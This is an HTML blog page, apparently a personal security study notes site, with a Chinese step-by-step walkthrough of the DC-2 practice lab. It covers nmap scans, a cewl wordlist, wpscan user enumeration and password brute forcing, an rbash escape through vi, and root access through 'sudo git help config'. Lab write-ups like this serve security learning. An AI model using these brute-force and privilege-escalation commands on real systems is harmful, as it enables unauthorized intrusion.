@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>DC-2 | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>DC-2</h1>
+    <div class="post-meta">
+      <time datetime="2025-11-30T16:29:46.000Z">2025.12.01</time>
+      <span>10 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# DC-2
+
+1.打开kali跟DC-2，设置NAT模式
+
+2.nmap -sn 192.168.243.0/24扫描的得到DC-2的IP192.168.243.134
+
+![image-20251129153910488](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129153910488.png)
+
+3.nmap -sT -v 192.168.243.134扫描开放端口得到http
+
+![image-20251129174238237](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174238237.png)
+
+4.访问192.168.243.134，发现找不到服务器，观察界面发现IP被强制转换为域名
+
+![image-20251129174420848](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174420848.png)
+
+5.打开本地hosts文件，路径C:\Windows\System32\drivers\etc\hosts
+
+添加192.168.243.134 dc-2
+
+6.成功访问网站，使用Wappalyzer查看网站信息
+
+![image-20251129174959395](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174959395.png)
+
+7.在网站中找到flag1，提示要用cewl生成字典
+
+![image-20251129174851529](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174851529.png)
+
+8.cewl http://dc-2/ -w pswd.txt 使用cewl爬取网页内容生成密码字典文件，并生成.txt文件
+
+9.dirb  http://192.168.243.134/ 挖掘网站隐藏目录，得到网站登录界面http://192.168.243.134/wp-admin
+
+10.wpscan --url http://dc-2/ -e u 枚举用户名，得到三个用户admin,jerry,tom
+
+![image-20251129220850042](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129220850042.png)
+
+11.将爆破出的三个用户名保存在user.txt中
+
+![image-20251129221623461](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129221623461.png)
+
+12.wpscan --url http://dc-2/ -U user.txt -P pswd.txt 爆得到两个有效账密
+
+![image-20251130135346108](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130135346108.png)
+
+13.登录jerry的账号,在page界面找到flag2
+
+![image-20251129222649099](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129222649099.png)
+
+If you can't exploit WordPress and take a shortcut, there is another way.
+
+Hope you found another entry point.
+
+14.可能漏掉了什么端口号
+
+nmap -A -p- 192.168.243.134进行全面扫描，得到ssh服务
+
+![image-20251129224645200](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129224645200.png)
+
+15.ssh tom@192.168.243.134 -p 7744 指定端口连接,远程登录tom用户
+
+16.ls 查看当前目录，发现flag3
+
+![image-20251129230602220](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129230602220.png)
+
+17.cat flag3 查看flag3
+
+![image-20251129231136616](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129231136616.png)
+
+被-rbash限制了
+
+18.compgen -c 列出所有能用的命令，发现有vi
+
+![image-20251129232326606](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232326606.png)
+
+19.使用vi flag.txt查看文件
+
+![image-20251129232340016](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232340016.png)
+
+20.尝试登录jerry用户，发现登录失败
+
+21.回到tom用户，使用vi提权
+
+![image-20251130013632703](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013632703.png)
+
+末行模式依次写入
+
+:set shell =/bin/sh
+
+:shell
+
+![image-20251130013730030](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013730030.png)
+
+![image-20251130013834927](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013834927.png)
+
+回车，得到部分权限
+
+22.cd .. 回到上级目录
+
+cd jerry  进入jerry的家目录发现flag4
+
+![image-20251130014007285](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014007285.png)
+
+vi flag4.txt  查看
+
+![image-20251130014059816](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014059816.png)
+
+23.PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  把可执行程序的搜索目录写进 PATH 变量
+
+export PATH  执行环境变量
+
+su jerry  切换成jerry用户
+
+![image-20251130201028762](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201028762.png)
+
+24.依然没有root权限
+
+![image-20251130201206422](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201206422.png)
+
+25.flag4.txt提示可以用git提权
+
+sudo -l  查看被sudo服务授权的命令
+
+![image-20251130210337888](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130210337888.png)
+
+26.sudo git help config
+
+!/bin/sh
+
+提权成功
+
+![image-20251201002919622](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251201002919622.png)
+
+# 注：
+
+1.DC-2靶机强制使用域名访问，在Web服务中做了重定向，即使输入IP，也会跳转到http://dc-2/，需要在hosts文件中加入192.168.243.134 dc-2让系统将域名解析到IP
+
+2.rbash全称 Restricted Bash，是 Bash 的一个“阉割版” shell。
+
+核心目的：给用户一个交互式命令行，但又能最大限度地锁住他，防止越权操作。
+
+3.在 Linux 命令行里，>> 是一个重定向操作符，作用是把命令的输出追加到指定文件的末尾，而不是覆盖原文件
+
+例：
+
+echo "hello" >> file.txt
+
+4.:set shell=/bin/sh
+设置内部选项，把选项 shell 改成 /bin/sh
+
+:shell打开一个交互式 shell,执行后 vim 会挂起，暂时进入 /bin/sh（或 set shell= 指定的那个解释器）里，在 shell 里 exit 后又回到 vim。
+
+5.Linux命令目录及用途
+
+| 目录              | 用途                          |
+| ----------------- | ----------------------------- |
+| `/usr/local/bin`  | 本地用户程序，供所有用户使用  |
+| `/usr/local/sbin` | 本地系统管理程序（root 专用） |
+| `/usr/bin`        | 发行版包管理器安装的普通程序  |
+| `/usr/sbin`       | 发行版包管理器安装的管理程序  |
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
